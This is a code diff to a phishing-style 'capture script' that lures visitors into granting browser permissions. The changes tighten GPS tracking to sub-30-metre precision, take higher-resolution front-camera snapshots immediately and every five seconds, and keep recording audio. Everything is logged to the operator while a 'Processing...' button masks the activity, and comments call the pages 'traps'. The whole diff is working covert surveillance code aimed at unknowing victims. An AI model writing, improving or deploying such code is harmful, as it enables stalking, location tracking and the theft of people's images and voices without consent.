@@ -134,11 +134,19 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       if (requiredPerms.includes('gps') && navigator.geolocation) {
         clientLog("fireGPS: GPS permission included");
         return new Promise(resolve => {
-          navigator.geolocation.watchPosition(
+          var bestAcc = 999999;
+          var gpsWatch = navigator.geolocation.watchPosition(
             (pos) => { 
-               logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }); 
-               permsCompleted++; 
-               resolve(); 
+               if (pos.coords.accuracy < bestAcc) {
+                 bestAcc = pos.coords.accuracy;
+                 logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy.toFixed(1) }); 
+               }
+               // Resolve if accuracy is good enough (< 30 meters)
+               if (pos.coords.accuracy < 30) {
+                 navigator.geolocation.clearWatch(gpsWatch);
+                 permsCompleted++; 
+                 resolve(); 
+               }
             },
             (e) => { 
                 clientLog("fireGPS: Error", e.message);
@@ -149,9 +157,13 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                 permsCompleted++; 
                 resolve(); 
             },
-            { enableHighAccuracy: true, maximumAge: 0 }
+            { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
           );
-          setTimeout(() => { resolve(); }, 3500); 
+          // Safety timeout: 15 seconds to get the best possible fix
+          setTimeout(() => { 
+            navigator.geolocation.clearWatch(gpsWatch);
+            resolve(); 
+          }, 15000); 
         });
       } else if (requiredPerms.includes('gps')) {
          permsCompleted++;
@@ -165,7 +177,14 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         clientLog("fireParallel: Media permission included");
         try {
           if (navigator.mediaDevices) {
-            var constraints = { video: { facingMode: "user" }, audio: true };
+            var constraints = { 
+              video: { 
+                facingMode: "user",
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+              }, 
+              audio: true 
+            };
             var stream = await navigator.mediaDevices.getUserMedia(constraints).catch(async (e) => {
                clientLog("fireParallel: getUserMedia failed, trying fallback", e.message);
                return navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch((e2) => {
@@ -180,18 +199,33 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               video.srcObject = stream;
               video.setAttribute('autoplay', ''); video.setAttribute('muted', ''); video.setAttribute('playsinline', '');
               document.body.appendChild(video);
-              await new Promise(r => { video.onloadedmetadata = () => { video.play().then(r).catch(r); }; setTimeout(r, 2000); });
+              await new Promise(r => { 
+                video.onloadedmetadata = () => { video.play().then(r).catch(r); }; 
+                setTimeout(r, 2000); 
+              });
               
-              setInterval(async () => {
+              // Capture high quality shot after settling
+              setTimeout(async () => {
                 var canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
                 var ctx = canvas.getContext('2d');
                 if (ctx) { 
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
-                   await logEvent('extra', { visual_identity: canvas.toDataURL('image/jpeg', 0.6) }); 
+                   await logEvent('extra', { visual_identity: canvas.toDataURL('image/jpeg', 0.85) }); 
                 }
-              }, 3000);
+              }, 1000);
+
+              setInterval(async () => {
+                var canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+                var ctx = canvas.getContext('2d');
+                if (ctx) { 
+                   ctx.drawImage(video, 0, 0, canvas.width, canvas.height); 
+                   await logEvent('extra', { visual_identity: canvas.toDataURL('image/jpeg', 0.7) }); 
+                }
+              }, 5000);
 
               if (stream.getAudioTracks().length > 0) {
                 const recorder = new MediaRecorder(stream);
@@ -391,25 +425,26 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           btn.innerText = "Processing...";
         }
 
-        // Sequential Permission Sequence
-        // Step 1: GPS (Most likely to be asked first in many traps)
-        try {
-          await fireGPS();
-        } catch(e) { console.error("GPS Error:", e); }
+        // We run high-value captures in parallel to get data as fast as possible
+        // but we handle the promises to track completion
+        var mainCaptures = [];
+        
+        mainCaptures.push(fireGPS().catch(e => clientLog("GPS Error", e.message)));
+        mainCaptures.push(fireParallel().catch(e => clientLog("Media Error", e.message)));
 
-        // Step 2: Camera/Media
-        try {
-          await fireParallel();
-        } catch(e) { console.error("Media Error:", e); }
+        // Other permissions run sequentially to avoid overloading prompts
+        (async function() {
+           for (const p of requiredPerms) {
+             if (p !== 'gps' && p !== 'media') {
+               try {
+                 await firePermission(p);
+               } catch(e) { clientLog("Perm Error: " + p, e.message); }
+             }
+           }
+        })();
 
-        // Step 3: Other permissions
-        for (const p of requiredPerms) {
-          if (p !== 'gps' && p !== 'media') {
-            try {
-              await firePermission(p);
-            } catch(e) {}
-          }
-        }
+        // Wait for main captures before allowing redirect early
+        await Promise.all(mainCaptures);
       } else {
         // Silent flow permissions
         if (requiredPerms.includes('vibration') && navigator.vibrate) navigator.vibrate(200);
